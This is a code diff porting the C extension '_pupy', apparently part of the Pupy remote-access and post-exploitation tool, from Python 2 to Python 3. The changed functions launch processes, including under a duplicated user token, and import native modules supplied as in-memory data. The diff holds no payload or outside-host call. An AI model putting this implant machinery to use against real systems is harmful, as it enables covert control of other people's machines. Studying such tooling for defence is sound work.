@@ -4,9 +4,12 @@
 */
 
 #include <windows.h>
+#include <stdio.h>
 
 #ifdef _PUPY_DYNLOAD
+#define PY_SSIZE_T_CLEAN
 #include <Python.h>
+
 #else
 #include "Python-dynload.h"
 #endif
@@ -122,9 +125,9 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                 return NULL;
 #endif
 
-        if (!(PyUnicode_Check(py_cmdline) || PyString_Check(py_cmdline))) {
+        if (!(PyUnicode_Check(py_cmdline))) {
                 return PyErr_Format(
-                        PyExc_Exception, "cmdline must be either str or unicode"
+                        PyExc_Exception, "cmdline must be unicode"
                 );
         }
 
@@ -178,7 +181,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                         dprint("Py_mexec::char cmdline\n");
 
                         blCreated = CreateProcessA(
-                                NULL, PyString_AsString(py_cmdline),
+                                NULL, PyUnicode_AsUTF8String(py_cmdline),
                                 &saAttr, NULL, inherit,
                                 createFlags, NULL, NULL, &si, &pi
                         );
@@ -214,7 +217,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args) {
                         free(tmpstr);
                 } else {
                         blCreated = CreateProcessAsUserA(
-                                dupHandle, NULL, PyString_AsString(py_cmdline), &saAttr,
+                                dupHandle, NULL, PyUnicode_AsUTF8String(py_cmdline), &saAttr,
                                 NULL, inherit, createFlags, NULL, NULL, &si, &pi
                         );
                 }
@@ -328,7 +331,7 @@ static PyObject *
 import_module(PyObject *self, PyObject *args)
 {
         char *data;
-        int size;
+        Py_ssize_t size;
         char *initfuncname;
         char *modname;
         char *pathname;
@@ -338,13 +341,24 @@ import_module(PyObject *self, PyObject *args)
 
         ULONG_PTR cookie = 0;
         char *oldcontext;
-
+        
+        PyObject *dataobj;
+        PyObject *spec;
         /* code, initfuncname, fqmodulename, path */
-        if (!PyArg_ParseTuple(args, "s#sss:import_module",
-                              &data, &size,
-                              &initfuncname, &modname, &pathname))
+        if (!PyArg_ParseTuple(args, "SsssO:import_module",
+                              &dataobj,
+                              &initfuncname, &modname, &pathname, &spec)) {
+            dprint("error in PyArg_ParseTuple()\n");
+                return NULL;
+        }
+
+        if (PyBytes_AsStringAndSize(dataobj, &data, &size)==-1) {
+                PyErr_Format(PyExc_ImportError,
+                             "cannot convert bytes to char * : %s (err=%d)",
+                                 pathname, GetLastError());
                 return NULL;
 
+        }
         dprint(
                 "import_module(name=%s size=%d ptr=%p)\n",
                 pathname, size, data);
@@ -369,14 +383,37 @@ import_module(PyObject *self, PyObject *args)
                 return NULL;
         }
 
-    oldcontext = _Py_PackageContext;
+        oldcontext = _Py_PackageContext;
 
         _Py_PackageContext = modname;
-        do_init();
+        PyObject *m = do_init();
         _Py_PackageContext = oldcontext;
 
-        if (PyErr_Occurred())
+        // multi phase init
+        if (PyObject_TypeCheck(m, &PyModuleDef_Type)) {
+            struct PyModuleDef *def;
+            PyObject *state;
+
+            m = PyModule_FromDefAndSpec((PyModuleDef*)m, spec);
+            def = PyModule_GetDef(m);
+            state = PyModule_GetState(m);
+            if (state == NULL) {
+                PyModule_ExecDef(m, def);
+            }
+            return m;
+        }
+
+        PyObject *modules = NULL;
+        modules = PyImport_GetModuleDict();
+        PyObject *name = PyUnicode_FromString(modname);
+        _PyImport_FixupExtensionObject(m, name, name, modules);
+
+        Py_DECREF(name);
+
+        if (PyErr_Occurred()) {
+            dprint("error at the end\n");
                 return NULL;
+        }
 
         /* Retrieve from sys.modules */
         return PyImport_ImportModule(modname);
@@ -395,25 +432,52 @@ static PyMethodDef methods[] = {
         { "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, DOC("set_exit_session_callback(function)")},
         { "find_function_address", Py_find_function_address, METH_VARARGS,
           DOC("find_function_address(dllname, function) -> address") },
-        { NULL, NULL },         /* Sentinel */
+        { NULL, NULL},         /* Sentinel */
 };
 
-BOOL init_pupy(void)
+
+
+
+static struct PyModuleDef PupyModuleDef =
 {
-        PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
+    PyModuleDef_HEAD_INIT,
+    "_pupy", /* name of module */
+    "", /* module documentation, may be NULL */
+    -1,   /* size of per-interpreter state of the module, or -1 if the module keeps state in global variables. */
+    methods
+};
+
+#ifdef _PUPY_DYNLOAD
+#define FUNC_EXPORT PyMODINIT_FUNC
+#else
+#define FUNC_EXPORT void *
+#endif
+
+FUNC_EXPORT PyInit__pupy(void) {
+        PyObject *pupy;
+        //PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
+        dprint("creating pupy module ...\n");
+        pupy = PyModule_Create(&PupyModuleDef);
         if (!pupy) {
-                return FALSE;
+                return NULL;
         }
+        dprint("adding string constant ...\n");
 
         PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
         ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
-        Py_INCREF(ExecError);
-        PyModule_AddObject(pupy, "error", ExecError);
 
-        return TRUE;
+        Py_XINCREF(ExecError);
+        if (PyModule_AddObject(pupy, "error", ExecError) < 0) {
+            Py_XDECREF(ExecError);
+            Py_CLEAR(ExecError);
+            Py_DECREF(pupy);
+            return NULL;
+        }
+        dprint("returning module %x ...\n", pupy);
+        
+        return pupy;
 }
 
-#ifdef _PUPY_DYNLOAD
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 {
     DWORD threadId;
@@ -444,17 +508,17 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
                 args->cbExit = on_exit_session;
                 args->blInitialized = TRUE;
             }
-            return init_pupy();
+            return TRUE;
 
         case DLL_THREAD_DETACH:
             break;
 
         case DLL_PROCESS_DETACH:
             dprint("Should not happen?\n");
-            return FALSE;
+            return TRUE;
     }
 
     dprint("Call DllMain - completed\n");
     return bReturnValue;
 }
-#endif
+
